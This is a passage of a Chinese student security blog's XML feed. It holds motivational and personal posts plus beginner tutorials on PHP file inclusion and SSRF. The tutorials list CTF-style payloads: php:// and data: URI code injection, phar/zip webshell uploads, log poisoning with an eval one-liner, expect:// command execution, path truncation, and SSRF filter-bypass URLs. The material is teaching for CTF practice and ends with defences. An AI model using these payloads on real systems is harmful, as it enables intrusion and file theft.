请求所带的cookie 中一定没有正确的CSRF token。</p><h2 id="相关文章"><a href="#相关文章" class="headerlink" title="相关文章"></a>相关文章</h2><p><a href="https://www.explainthis.io/zh-hant/swe/what-is-csrf">https://www.explainthis.io/zh-hant/swe/what-is-csrf</a></p><p><a href="https://gcdeng.com/blog/five-ways-to-defend-against-CSRF-attacks">https://gcdeng.com/blog/five-ways-to-defend-against-CSRF-attacks</a></p><p><a href="https://xz.aliyun.com/t/12866?time__1311=mqmhq+xfx0xIODBqDTexUx2KH50KNe+dD8eD&alichlgref=https://www.google.com/#toc-3">https://xz.aliyun.com/t/12866?time__1311=mqmhq%2Bxfx0xIODBqDTexUx2KH50KNe%2BdD8eD&amp;alichlgref=https%3A%2F%2Fwww.google.com%2F#toc-3</a></p>]]></content>
      
      
      <categories>
          
          <category> CSRF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 入门 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>安全需要什么特质</title>
      <link href="/2024/06/17/%E5%AE%89%E5%85%A8%E9%9C%80%E8%A6%81%E4%BB%80%E4%B9%88%E7%89%B9%E8%B4%A8/"/>
      <url>/2024/06/17/%E5%AE%89%E5%85%A8%E9%9C%80%E8%A6%81%E4%BB%80%E4%B9%88%E7%89%B9%E8%B4%A8/</url>
      
        <content type="html"><![CDATA[<p>​<strong>前言</strong></p><p>​诸位安好，我是pax。从本文章开始，我们进入了一个新的系列：初识安全。本系列旨在帮助安全小白们轻松高效地入门网络安全。那么现在，开始吧！</p><p>​学习安全，需要什么样的精神和特质呢？这是很难说的，但又是极为重要的。这是我提问的，却是需要你们作答的。我且抛砖引玉：</p><p>​<strong>兴趣终将蜕变为热爱</strong></p><p>​往来千古，群星闪烁。成大事者，多始于兴趣，终于热爱。</p><p>​但是，除却极少数一眼安全的人，大多数童鞋或许和pax一样：初次接触安全，谈不上热爱，只有点点兴趣。</p><p>​但这足够了，点点兴趣亦可化作两翼热爱，长风破浪，直向南溟。</p><p>​或许有些聪明的童鞋想到了，这个过程是相当理想的。如何使兴趣汇成热爱，是安全一道避无可避的问题。</p><p>对此，我粗浅地回答：亿点点的坚持和一瞬的花火！</p><p>​</p><p>​<strong>亿点点的坚持</strong></p><p>​安全从来就不是简单的专业，而是一生的学习。</p><p>·在有限的四年，按部就班的学习可不能喂饱安全。它抢走你珍惜的闲暇、充裕的睡眠、偶尔的假期。童鞋，你会因此愤怒吗？可这就是安全。安全职位的缺口很大，但没有一个会留给半吊子。</p><p>​我常常回想，我或许不是一位大学生，而是一位轻松些许的高中生。可是回望这一年的学习成果还是略显不满，太少了：学的太少了、懂的太少了、四年太少了、要求太少了······唉，谁让我选择了安全呢，谁让我还想坚持呢。</p><p>​童鞋，只管埋头看路，前方日夜轮转，万物明朗！</p><p>​<strong>一瞬的花火</strong></p><p>​“安全最让你感兴趣的一点是什么？”<br>​“灵感，那一瞬的花火”</p><p>​“怎么说？”</p><p>​“灵光一闪，周身沸腾，万事通明，题目自不在话下。”</p><p>​“万一灵感错了呢？”</p><p>​“em······就挺崩溃的。”</p><p>​你迟早会爱上这一瞬的花火，就连flag都没那么迷人了。安全一途，坚持和寂寞是底色，而灵感是最好的增色。比如猜出了注入点，绕过了waf，想到了非预期······安全的快乐就这么简单（过程可相当不简单）。</p><p>​一瞬的花火源自于长久的坚守，却是安全必须具备的特质，我们简称为：脑洞大。没有亿点点坚持堆积的干柴，又如何燃烧起灵光的沸火——思而不学则殆。可是纵使干柴堆作青山，不能使思绪起舞，也是枉然——学而不思则罔。</p><p>​<strong>结语</strong></p><p>​安全就是安全，它充满魅力，却全是荆棘。与其远远观望，不若任凭满手鲜血，摘取心中的一抹嫣红。骚年，此路欢声笑语却孤寂无人，此行漫漫无期却万物明朗，此心跌跌撞撞却纯粹可爱。</p><p>​欢迎进入安全的世界，我是pax，你忠实的同行者。</p>]]></content>
      
      
      <categories>
          
          <category> 安全小窝 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 学习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>一位骚年的安全之路</title>
      <link href="/2024/06/16/%E4%B8%80%E4%BD%8D%E9%AA%9A%E5%B9%B4%E7%9A%84%E5%AE%89%E5%85%A8%E4%B9%8B%E8%B7%AF/"/>
      <url>/2024/06/16/%E4%B8%80%E4%BD%8D%E9%AA%9A%E5%B9%B4%E7%9A%84%E5%AE%89%E5%85%A8%E4%B9%8B%E8%B7%AF/</url>
      
        <content type="html"><![CDATA[<p>​诸位安好，我是pax。这是安全小窝的第一篇文章，亦是我人生的第一篇公众号。实不相瞒，我思考了好一会，这么一篇极具意义的文章该写点啥嘞？Web知识，安全工具，还是专业普及？我突然拍腿！为什么不写写自己的学习和心路历程呢？ 开干！等等，我好像，似乎，应该，还不会写文章······</p><p>​</p><p>​23年的暑假，高考的肃穆被完结的钟声摧碎，盛夏的蝉鸣流淌在云端间隙。一个超常发挥的骚年选择了信息安全专业，命运的齿轮无息间上了润滑油。对于这个全然陌生的专业，骚年又能知道些什么呢？只能把抖音的只言片语堵满即将退化的大脑：</p><p>​“信息安全是个什么样的专业呢？”</p><p>​“好像是黑客！等等，什么，我竟然会成为黑客！”</p><p>​“好像，有点酷嘞！”</p><p>​“嘿嘿，薪资还不错，就决定是你了”</p><p>​</p><p>​胡思乱想，思绪同未来碰撞，隐约闪烁着一位少年的懵懂与期待：你好，未来！</p><p>​有时候你不得不问候命运，不管是亲切的还是悲切的。信息安全属于计算机大类，而我已经好久没碰过电脑了，就连洛克王国的宠物蛋都安详地瘫了数年，合理估计永远都醒不来了。</p><p>​有时候你又不得不感谢命运。我遇到了一位极好极好的引路人，我称呼他为“豆哥”。豆哥有多好，这是一件难以考证的事情（虽然但是才过去了一年）。</p><p>​</p><p>​咳咳，拉回即将扯偏的时间线。我有意了解过咱们专业的战队，也想赶紧学一点东西填脑子（当然绝对不是因为颓废了三个月）。有时缘分就是这么神奇，我QQ上填了豆哥的老家（那也是我待了十几年的地方），豆哥也因此了解到了我。从此，上了润滑油的齿轮开始飞动，一代Web佬中佬开始了他的传奇旅程（日常口嗨，万一成真了呢哈哈哈）。</p><p>​九月流火，军训折磨。流光在午休和晚休间跳跃，骚年一直对着记事本死敲HTML。熟练敲完HTML格式的骚年觉得自己天下无敌，却不知道原来还有vscode这样方便的IDE，从豆哥口中骚年学到了第一个道理：</p><p>​“懒惰是人类进步的动力。”</p><p>​骚年孤独吗，当时可没想那么多，如今回忆起却为他感到孤独。但是孤独是短暂的。或许是豆哥认同了骚年一直的努力，新名甜瓜的骚年认识了许多志同道合的同学。Wells，薯条，地雷······安全一途，日后请多多关照！</p><p>​这真让人记忆犹新，连ctf都不太了解的骚年被豆哥塞了一份西电题目，就好像还不会写字的小孩要当场作诗，你也觉得这很难评对吧！这还只是开胃小菜，一大堆的软件要下，一大堆环境变量要配，一大堆术语听不懂······</p><p>​</p><p>​当然，有一个人例外。Wells是唯一一个可以跟得上豆哥的man。他坚持认为他跟我们一样的基础，年少的我信了。可智慧如我，只需细细咂摸：</p><p>​“你在开什么国际玩笑！我们之间的差距不小于太平洋啊啊啊啊！”</p><p>​</p><p>​差距再大，还能再大。咳咳，但骚年还是有进步的。骚年按着豆哥的要求一步步埋头苦干，也算是入了Web的大门。中间有过狂妄，有过奔溃，有过欣喜，但唯一不变的是豆哥的耐心和同伴的共勉。我也好想写写做题时的奔溃和无奈，但是真要付诸笔端，也只有轻笑一声，任凭往事如风。</p><p>​有资格进入战队预备队的骚年满怀好奇，队伍不大（必须承认豆哥的魅力，这届Web人好多），但是联系紧密。战队最大的特点正是豆哥打动我们的地方：互帮互助，永不嫌弃！</p><p>​豆哥传承了战队的特点，我也必定将之传承。传承，也正是我创始这个公众号的初心和使命！</p><p>​最后，诸位安好！我叫pax，我会不定期分享有关安全的知识，向诸位献丑了。</p><p>​</p><p>​</p><p>​</p><p>​</p><p>​</p>]]></content>
      
      
      <categories>
          
          <category> 安全小窝 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 感悟 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>文件包含入门</title>
      <link href="/2024/05/26/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%85%A5%E9%97%A8/"/>
      <url>/2024/05/26/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%85%A5%E9%97%A8/</url>
      
        <content type="html"><![CDATA[<h1 id="文件包含入门"><a href="#文件包含入门" class="headerlink" title="文件包含入门"></a>文件包含入门</h1><p>参考文章：<a href="https://blog.csdn.net/Fly_hps/article/details/80926992">PHP漏洞全解————10、PHP文件包含漏洞_action&#x3D;%252e%252e%255c%252e%252e%255c%252e%252e%25-CSDN博客</a></p><h2 id="0x01-基础知识"><a href="#0x01-基础知识" class="headerlink" title="0x01 基础知识"></a>0x01 基础知识</h2><h3 id="相关函数"><a href="#相关函数" class="headerlink" title="相关函数"></a>相关函数</h3><p>必看：<a href="https://www.php.net/manual/zh/function.include.php">https://www.php.net/manual/zh/function.include.php</a></p><ul><li>include， require</li></ul><p>基础就不多说了，require报错会终止程序，但是include会继续执行下面代码。</p><ul><li>include_once &amp; require_once</li></ul><p>包含过的就不会继续包含</p><h3 id="漏洞成因"><a href="#漏洞成因" class="headerlink" title="漏洞成因"></a>漏洞成因</h3><ul><li>具有相关的危险函数</li><li>包含变量可控</li></ul><h2 id="0x02-漏洞类型"><a href="#0x02-漏洞类型" class="headerlink" title="0x02 漏洞类型"></a>0x02 漏洞类型</h2><h3 id="LFI-Local-File-Inclusion"><a href="#LFI-Local-File-Inclusion" class="headerlink" title="LFI(Local File Inclusion)"></a>LFI(Local File Inclusion)</h3><blockquote><p>本地文件包含漏洞，顾名思义，指的是能打开并包含本地文件的漏洞。大部分情况下遇到的文件包含漏洞都是LFI。</p></blockquote><h3 id="RFI-Remote-File-Inclusion"><a href="#RFI-Remote-File-Inclusion" class="headerlink" title="RFI(Remote File Inclusion)"></a>RFI(Remote File Inclusion)</h3><blockquote><p>远程文件包含漏洞。是指能够包含远程服务器上的文件并执行。由于远程服务器的文件是我们可控的，因此漏洞一旦存在危害性会很大。</p></blockquote><p>RFI对php.ini里的配置有些要求：</p><ul><li>allow_url_fopen &#x3D; On</li><li>allow_url_include &#x3D; On</li></ul><p><code>allow_url_fopen</code> 允许 PHP 读取远程文件，而 <code>allow_url_include</code> 则允许 PHP 在代码中包含远程文件。</p><blockquote><p>在php.ini中，allow_url_fopen默认一直是On，而allow_url_include从php5.2之后就默认为Off。</p></blockquote><h2 id="0x03-包含方法"><a href="#0x03-包含方法" class="headerlink" title="0x03 包含方法"></a>0x03 包含方法</h2><h3 id="php伪协议"><a href="#php伪协议" class="headerlink" title="php伪协议"></a>php伪协议</h3><p>参考文章：<a href="https://we11s.github.io/posts/2344074049/#php-filter">https://we11s.github.io/posts/2344074049/#php-filter</a></p><blockquote><p>访问各个输入&#x2F;输出流(I&#x2F;O streams)，伪协议提供了多种不同的方式来访问和处理数据</p><p>在CTF中经常使用的是<code>php://filter</code>和<code>php://input</code>、<code>php://filter</code>用于读取源码，<code>php://input</code>用于执行POST参数中的php代码。</p></blockquote><h4 id="php-input"><a href="#php-input" class="headerlink" title="php:&#x2F;&#x2F;input"></a>php:&#x2F;&#x2F;input</h4><p>配置要求：</p><p>allow_url_fopen &#x3D; 无所谓</p><p>allow_url_include &#x3D; On</p><pre><code class="highlight plaintext">GET?file=php://inputPOST:&lt;? phpinfo();?&gt;</code></pre><h4 id="php-filter"><a href="#php-filter" class="headerlink" title="php:&#x2F;&#x2F;filter"></a>php:&#x2F;&#x2F;filter</h4><h5 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h5><blockquote><p><code>php://filter</code>可以作为一个位于原始数据流和最终目标之间的中间流来处理其他流，负责对数据进行处理。（即读取或写入数据之前对其进行修改或过滤。）</p></blockquote><p>配置要求：</p><p>allow_url_fopen &#x3D; 无所谓</p><p>allow_url_include &#x3D; 无所谓</p><h5 id="过滤器"><a href="#过滤器" class="headerlink" title="过滤器"></a>过滤器</h5><ul><li><p>字符串过滤器：<a href="https://www.php.net/manual/zh/filters.string.php">PHP: 字符串过滤器 - Manual</a></p></li><li><p>转换过滤器：<a href="https://www.php.net/manual/zh/filters.convert.php">PHP: 转换过滤器 - Manual</a></p></li></ul><p>​常用：<code>convert.base64-encode</code>和<code> convert.base64-decode</code>（将字符串进行base64编码加解密）</p><p>​注：转换过滤器是 PHP 5.0.0 添加的</p><h5 id="结构"><a href="#结构" class="headerlink" title="结构"></a>结构</h5><p>exp：</p><p><code>index.php?file=php://filter/read=convert.base64-encode/resource=index.php</code></p><p>结构不难理解，头+过滤器+文件，将结果解码即可。</p><h3 id="phar"><a href="#phar" class="headerlink" title="phar:&#x2F;&#x2F;"></a>phar:&#x2F;&#x2F;</h3><blockquote><p>phar:&#x2F;&#x2F; 是用来解压的伪协议<br>phar:&#x2F;&#x2F;不管参数中是什么拓展名，都会被当做压缩包<br>用法：<code>?file=phar://压缩包/压缩文件</code><br>比如：<code>phar://xxx.png/shell.php</code><br><strong>利用phar:&#x2F;&#x2F; 时，PHP配置文件需要开启allow_url_fopen和allow_url_include，并且PHP版本要高于5.3.0</strong></p><p>写一个木马文件shell.php，然后用zip:&#x2F;&#x2F;伪协议压缩成shell.zip，最后修改后缀名为.png，上传图片<br>输入测试：<code>http://www.abc.com/xxx/file.php?file=phar://shell.png/shell.php</code></p><p>这样phar:&#x2F;&#x2F;就会将png当做zip压缩包进行解压，并且访问解压后的shell.php文件</p></blockquote><p>格式：<code>phar://压缩包/压缩文件</code>，前提是这个压缩包可控</p><h3 id="zip"><a href="#zip" class="headerlink" title="zip:&#x2F;&#x2F;"></a>zip:&#x2F;&#x2F;</h3><blockquote><p>和phar:&#x2F;&#x2F;伪协议原理类似，但用法不同<br>用法：<code>?file=zip://[压缩文件绝对路径]#[压缩文件内的子文件名]</code><br><strong>利用zip:&#x2F;&#x2F; 时，PHP配置文件需要开启allow_url_fopen和allow_url_include，并且PHP版本要高于5.3.0</strong></p><p>注意：需要将#转换成URL编码：%23</p></blockquote><p>格式：zip:&#x2F;&#x2F;[压缩文件绝对路径]#[压缩文件内的子文件名]</p><h3 id="expect"><a href="#expect" class="headerlink" title="expect:&#x2F;&#x2F;"></a>expect:&#x2F;&#x2F;</h3><p>不太好用，要安装拓展</p><pre><code class="highlight plaintext">http://example.com/index.php?page=php:expect://idhttp://example.com/index.php?page=php:expect://ls</code></pre><h3 id="data-URI，schema"><a href="#data-URI，schema" class="headerlink" title="data:URI，schema"></a>data:URI，schema</h3><p>利用条件：</p><ul><li>php版本大于等于php5.2</li><li>allow_url_fopen &#x3D; On</li><li>allow_url_include &#x3D; On</li></ul><p>方法一：</p><p><code>index.php?file=data:text/plain,&lt;?php phpinfo();?&gt;</code></p><p>方法二：</p><p><code>index.php?file=data:text/plain;base64,PD9waHAgcGhwaW5mbygpOz8%2b</code></p><blockquote><p>加号 <code>+</code> 的url编码为 <code>%2b</code> ， <code>PD9waHAgcGhwaW5mbygpOz8+</code> 的base64解码为： <code>&lt;?php phpinfo();?&gt;</code></p></blockquote><h3 id="包含session"><a href="#包含session" class="headerlink" title="包含session"></a>包含session</h3><p>推荐文章：</p><p><a href="https://www.jianshu.com/p/e6f59f3f01b8%EF%BC%8C%E8%AF%A5%E6%96%87%E7%AB%A0%E8%AE%B2%E5%BE%97%E5%BE%88%E6%B7%B1%E5%88%BB%EF%BC%8C%E6%88%91%E5%8F%AA%E8%83%BD%E7%B2%97%E6%B5%85%E7%90%86%E8%A7%A3%E4%B8%80%E4%BA%9B">https://www.jianshu.com/p/e6f59f3f01b8，该文章讲得很深刻，我只能粗浅理解一些</a></p><p><a href="https://www.cnblogs.com/r1kka/p/15848498.html">ctfshow web82：利用session.upload_progress进行文件包含 - r1kka - 博客园 (cnblogs.com)</a>，这篇原理讲得很好</p><h4 id="基础"><a href="#基础" class="headerlink" title="基础"></a>基础</h4><blockquote><p>该功能是在php5.4添加的，首先先了解下php.ini以下的几个默认选项</p><pre><code class="highlight plaintext">session.upload_progress.enable = onsession.upload_progress.cleanup = onsession.upload_progress.prefix = &quot;upload_progress_&quot;session.upload_progress.name = &quot;PHP_SESSION_UPLOAD_PROGRESS&quot;</code></pre><ul><li><code>enable = on</code>表示upload_progress功能开始，也意味着当浏览器向服务器上传一个文件时，php将会把此次文件上传的详细信息(如上传时间、上传进度等)存储在session当中 ；</li><li><code>cleanup = on</code>表示当文件上传结束后，php将会立即清空对应session文件中的内容，这个选项非常重要；</li><li><code>name</code>当它出现在表单中，php将会报告上传进度，最大的好处是，它的值可控；</li><li><code>prefix+name</code>将表示为session中的键名;</li><li>另外还有一个session配置中的重要选项：<code>session.use_strict_mode=off</code>这个选项默认值为off，表示我们对Cookie中sessionid可控。</li></ul></blockquote><p><code>cleanup</code>选项决定了我们需要条件竞争</p><blockquote><p>如果<code>session.auto_start=on</code>，则php会在接收请求的时候会自动初始化Session，不再需要执行<code>session_start()</code>。但默认情况下，这个选项都是关闭的。但session还有一个默认选项，<code>session.use_strict_mode</code>默认值为0。此时用户是可以自己定义Session ID的。比如，我们在Cookie里设置PHPSESSID&#x3D;rikka，PHP将会在服务器上创建一个文件<code>/tmp/sess_rikka</code>。即使此时用户没有初始化Session，PHP也会自动初始化Session。 并产生一个键值，这个键值有<code>ini.get(“session.upload_progress.prefix”)</code>+由我们构造的<code>session.upload_progress.name</code>值组成，最后被写入sess_文件里；</p><p>简而言之，我们自定义的PHPSESSID的值会变成文件名，比如定义PHPSESSID:rikka，文件名即为&#x2F;tmp&#x2F;sess_rikka，而PHP_SESSION_UPLOAD_PROGRESS的值即为该文件的内容</p></blockquote><p>简而言之，在Cookie对PHPSESSID赋值，可控文件名。</p><h4 id="关键点"><a href="#关键点" class="headerlink" title="关键点"></a>关键点</h4><h3 id="包含日志"><a href="#包含日志" class="headerlink" title="包含日志"></a>包含日志</h3><h4 id="常规"><a href="#常规" class="headerlink" title="常规"></a>常规</h4><p><a href="https://6a93bac8-4958-4014-aa48-1ad8e2c5f69a.challenge.ctf.show/">https://6a93bac8-4958-4014-aa48-1ad8e2c5f69a.challenge.ctf.show/</a>?&lt;?php eval($_POST[cmd]);</p><ul><li>要先知道日志位置：</li></ul><p>nginx：&#x2F;var&#x2F;log&#x2F;nginx&#x2F;access.log</p><p>apache：&#x2F;var&#x2F;log&#x2F;apache2&#x2F;access_log(access.log)</p><ul><li>payload插入：</li></ul><p>UA头，GET参数</p><p>UA头不需要抓包解码，GET参数需要。</p><p>最后getshell即可</p><h4 id="SSH-log"><a href="#SSH-log" class="headerlink" title="SSH log"></a>SSH log</h4><p>用户名不合法，气死我了</p><h3 id="包含environ"><a href="#包含environ" class="headerlink" title="包含environ"></a>包含environ</h3><p>包含的原理也不难</p><ul><li><p>找到写入点</p><p>UA头</p></li><li><p>找到包含地址</p><p><code>/proc/self/environ</code></p></li></ul><p>条件：</p><ul><li>php以cgi方式运行，这样environ才会保持UA头。</li><li>environ文件存储位置已知，且environ文件可读。</li></ul><h3 id="包含fd"><a href="#包含fd" class="headerlink" title="包含fd"></a>包含fd</h3><p>与包含environ类似，不过比较麻烦，之后做到再说</p><h3 id="包含临时文件"><a href="#包含临时文件" class="headerlink" title="包含临时文件"></a>包含临时文件</h3><p>同样要竞争</p><h3 id="包含上传文件"><a href="#包含上传文件" class="headerlink" title="包含上传文件"></a>包含上传文件</h3><p>配合文件上传漏洞，基本原理不变</p><h3 id="其余"><a href="#其余" class="headerlink" title="其余"></a>其余</h3><p>需要深入理解文件包含，其他的应用未必不能文件包含，见招拆招，不断学习。</p><h2 id="0x04-绕过姿势"><a href="#0x04-绕过姿势" class="headerlink" title="0x04 绕过姿势"></a>0x04 绕过姿势</h2><p>实际上对于包含的文件名往往有限制，比如前缀和后缀等等。</p><p>参考文章：<a href="https://www.cnblogs.com/Zeker62/p/15322771.html#%E6%9C%89%E9%99%90%E5%88%B6%E7%9A%84%E8%BF%9C%E7%A8%8B%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB">https://www.cnblogs.com/Zeker62/p/15322771.html#%E6%9C%89%E9%99%90%E5%88%B6%E7%9A%84%E8%BF%9C%E7%A8%8B%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB</a></p><h3 id="指定前缀"><a href="#指定前缀" class="headerlink" title="指定前缀"></a>指定前缀</h3><h4 id="目录遍历"><a href="#目录遍历" class="headerlink" title="目录遍历"></a>目录遍历</h4><p>这个比较简单，不做多述。</p><h4 id="编码绕过"><a href="#编码绕过" class="headerlink" title="编码绕过"></a>编码绕过</h4><p>有时把点号过滤了，尝试编码点号。</p><h3 id="指定后缀"><a href="#指定后缀" class="headerlink" title="指定后缀"></a>指定后缀</h3><h4 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h4><p>URL格式在此处具有妙用，可以在payload最后加**?<strong>或者</strong>#<strong>，或者空格绕过</strong>%20**</p><h4 id="使用协议"><a href="#使用协议" class="headerlink" title="使用协议"></a>使用协议</h4><p>phar:&#x2F;&#x2F;和zip:&#x2F;&#x2F;都可以</p><h4 id="长度截断"><a href="#长度截断" class="headerlink" title="长度截断"></a>长度截断</h4><blockquote><p>利用条件： php版本 &lt; php 5.2.8</p><p>目录字符串，在linux下4096字节时会达到最大值，在window下是256字节。只要不断的重复<code>./</code>，则后缀<code>/test/test.php</code>，在达到最大值后会被直接丢弃掉。</p></blockquote><p>对路径进行修改即可，可以使用脚本（不会真的有人手搓吧哈哈哈）</p><h4 id="0字节截断"><a href="#0字节截断" class="headerlink" title="0字节截断"></a>0字节截断</h4><p>利用条件： php版本 &lt; php 5.3.4</p><pre><code class="highlight php">index.php?file=phpinfo.txt%<span class="number">00</span></code></pre><h3 id="指定前后缀"><a href="#指定前后缀" class="headerlink" title="指定前后缀"></a>指定前后缀</h3><p>如果同时有前后缀，该怎么绕过呢？比如：</p><pre><code class="highlight plaintext">&lt;?php    $file = $_GET[&#x27;file&#x27;];    include &#x27;/var/www/html/&#x27;.$file.&#x27;/test/test.php&#x27;;?&gt;</code></pre><p>可以使用目录遍历和长度截断（或者0字节截断），有必要的话可以对点号编码，至少协议和URL使用不了。</p><p>可知指定前缀的基础上很难使用URL方法，思路集中在路径上。</p><h2 id="0x05-防御方案"><a href="#0x05-防御方案" class="headerlink" title="0x05 防御方案"></a>0x05 防御方案</h2><ul><li>在很多场景中都需要去包含web目录之外的文件，如果php配置了open_basedir，则会包含失败</li><li>做好文件的权限管理</li><li>对危险字符进行过滤等等</li></ul><blockquote><p><code>open_basedir</code> 的主要作用是限制 PHP 脚本只能访问指定的目录及其子目录。这样，即使某个脚本存在漏洞，也无法访问超出这些限定目录之外的文件</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 文件包含 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 入门 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SSRF入门</title>
      <link href="/2024/05/26/SSRF%E5%85%A5%E9%97%A8/"/>
      <url>/2024/05/26/SSRF%E5%85%A5%E9%97%A8/</url>
      
        <content type="html"><![CDATA[<h1 id="SSRF入门"><a href="#SSRF入门" class="headerlink" title="SSRF入门"></a>SSRF入门</h1><h2 id="0x00-概述"><a href="#0x00-概述" class="headerlink" title="0x00 概述"></a>0x00 概述</h2><p>SSRF(Server-Side Request Forgery:服务器端请求伪造) 是一种由攻击者构造形成由服务端发起请求的一个安全漏洞。</p><p>一般情况下，SSRF攻击的目标是从外网无法访问的内部系统。（正是因为它是由服务端发起的，所以它能够请求到与它相连而与外网隔离的内部系统）</p><hr><h2 id="0x01-原理"><a href="#0x01-原理" class="headerlink" title="0x01 原理"></a>0x01 原理</h2><p>SSRF 形成的原因大都是由于服务端提供了从其他服务器应用获取数据的功能且没有对目标地址做过滤与限制。</p><p>简单来说：所有目标服务器会从自身发起请求的功能点，且我们可以控制地址的参数，都可能造成SSRF漏洞</p><hr><h2 id="0x02-SSRF危害"><a href="#0x02-SSRF危害" class="headerlink" title="0x02 SSRF危害"></a>0x02 SSRF危害</h2><p>1.内外网的端口和服务扫描</p><p>2.攻击运行在内网或本地的应用程序</p><p>3.对内网web应用进行指纹识别，识别企业内部的资产信息</p><p>4.攻击内网的web应用，主要是使用GET参数就可以实现的攻击（比如Struts2漏洞利用，SQL注入等）</p><p>5.利用file协议读取本地敏感数据文件等</p><hr><h2 id="0x03-造成SSRF的函数"><a href="#0x03-造成SSRF的函数" class="headerlink" title="0x03 造成SSRF的函数"></a>0x03 造成SSRF的函数</h2><p>SSRF涉及到的危险函数主要是网络访问，支持伪协议的网络读取。</p><h3 id="file-get-contents"><a href="#file-get-contents" class="headerlink" title="file_get_contents()"></a>file_get_contents()</h3><p><a href="https://www.php.net/manual/zh/function.file-get-contents.php">PHP: file_get_contents - Manual</a></p><blockquote><p>(PHP 4 &gt;&#x3D; 4.3.0, PHP 5, PHP 7, PHP 8)</p><p>file_get_contents — 将整个文件读入一个字符串</p></blockquote><p>这里可以用来获取远程数据，比如源码和图片。</p><h3 id="sockopen"><a href="#sockopen" class="headerlink" title="sockopen()"></a>sockopen()</h3><p><a href="https://www.php.net/manual/zh/function.fsockopen.php">PHP: fsockopen - Manual</a></p><blockquote><p>(PHP 4, PHP 5, PHP 7, PHP 8)</p><p>fsockopen — 打开 Internet 或者 Unix 套接字连接</p></blockquote><p>简单来说就是：跟服务器建立tcp连接，传输原始数据。</p><h3 id="curl-exec"><a href="#curl-exec" class="headerlink" title="curl_exec()"></a>curl_exec()</h3><p><a href="https://www.php.net/manual/zh/function.curl-exec.php">PHP: curl_exec - Manual</a></p><blockquote><p>(PHP 4 &gt;&#x3D; 4.0.2, PHP 5, PHP 7, PHP 8)</p><p>curl_exec — 执行 cURL 会话</p><p>这个函数应该在初始化 cURL 会话并且设置所有选项后调用。</p></blockquote><p>这个还是相当常见的</p><h2 id="0x04-绕过"><a href="#0x04-绕过" class="headerlink" title="0x04 绕过"></a>0x04 绕过</h2><p>一般来说，对于SSRF的限制在于对攻击者IP的限制（其要求发送者IP的合法性），这里需要绕过。</p><h3 id="IP进制改写"><a href="#IP进制改写" class="headerlink" title="IP进制改写"></a>IP进制改写</h3><p>若对IP进行正则过滤，可以通过改写IP形式来绕过</p><blockquote><p>对于这种过滤我们采用改编IP的写法的方式进行绕过，例如192.168.0.1这个IP地址可以被改写成：</p><ul><li>8进制格式：0300.0250.0.1</li><li>16进制格式：0xC0.0xA8.0.1</li><li>10进制整数格式：3232235521</li><li>16进制整数格式：0xC0A80001</li><li>合并后两位：1.1.278 &#x2F; 1.1.755</li><li>合并后三位：1.278 &#x2F; 1.755 &#x2F; 3.14159267</li></ul><p>另外IP中的每一位，各个进制可以混用。</p><p>访问改写后的IP地址时，Apache会报400 Bad Request，但Nginx、MySQL等其他服务仍能正常工作。</p><p>另外，0.0.0.0这个IP可以直接访问到本地，也通常被正则过滤遗漏。</p></blockquote><h3 id="使用解析到内网的域名"><a href="#使用解析到内网的域名" class="headerlink" title="使用解析到内网的域名"></a>使用解析到内网的域名</h3><blockquote><p>如果服务端没有先解析IP再过滤内网地址，我们就可以使用localhost等解析到内网的域名。</p><p>另外 <code>xip.io</code> 提供了一个方便的服务，这个网站的子域名会解析到对应的IP，例如192.168.0.1.xip.io，解析到192.168.0.1</p></blockquote><h3 id="绕过"><a href="#绕过" class="headerlink" title="@绕过"></a>@绕过</h3><blockquote><p>要求URL中必须包含<code>http://notfound.ctfhub.com</code>，来尝试利用URL的一些特殊地方绕过这个限制吧</p><p>构造payload：</p><p><code>?url=http://notfound.ctfhub.com@127.0.0.1/flag.php</code></p><p>如果要求以<code>http://notfound.ctfhub</code>开头<code>.com</code> 结尾的话，依旧可以使用@</p><p>payload</p><p><code>?url=http://notfound.ctfhub@127.0.0.1/flag.php.com</code></p><p>或者：</p><p><code>url=http://ctf.@127.0.0.1/flag.php#show</code></p></blockquote><p>此类需要某某开头 某某结束的题目均可使用@进行绕过。</p><h3 id="回环地址绕过"><a href="#回环地址绕过" class="headerlink" title="回环地址绕过"></a>回环地址绕过</h3><p>回环地址不止127.0.0.1，这便有了很大的操作空间</p><pre><code class="highlight plaintext">url=http://0/flag.phpurl=http://0.0/flag.phpurl=http://sudo.cc/flag.phphttp://localhost/http://[0:0:0:0:0:ffff:127.0.0.1]/http://①②⑦.⓪.⓪.①</code></pre><h3 id="302跳转"><a href="#302跳转" class="headerlink" title="302跳转"></a>302跳转</h3><p>这个对程序的逻辑有要求</p><p>由于跳转的发起者是服务端，所以127.0.0.1自然也是服务端的本机。</p><p>需要自己搭个服务跳转</p><h3 id="利用URL伪协议"><a href="#利用URL伪协议" class="headerlink" title="利用URL伪协议"></a>利用URL伪协议</h3><h4 id="Gopher协议"><a href="#Gopher协议" class="headerlink" title="Gopher协议"></a>Gopher协议</h4><blockquote><p>通过gopher，可以在一个url参数中构造POST或者GET请求，从而达到攻击内网应用的目的。例如可以使用gopher协议对与内网的Redis服务进行攻击，可以使用如下的URL：</p></blockquote><p>我写过一篇博客：<a href="https://pax-pq.github.io/2024/05/18/Gopher%E5%85%A5%E9%97%A8/">https://pax-pq.github.io/2024/05/18/Gopher%E5%85%A5%E9%97%A8/</a></p><h4 id="file协议"><a href="#file协议" class="headerlink" title="file协议"></a>file协议</h4><p>读取文件很好用，exp：</p><p><code>file://var/www/html/flag.php</code></p><h4 id="dict协议"><a href="#dict协议" class="headerlink" title="dict协议"></a>dict协议</h4><blockquote><p>dict 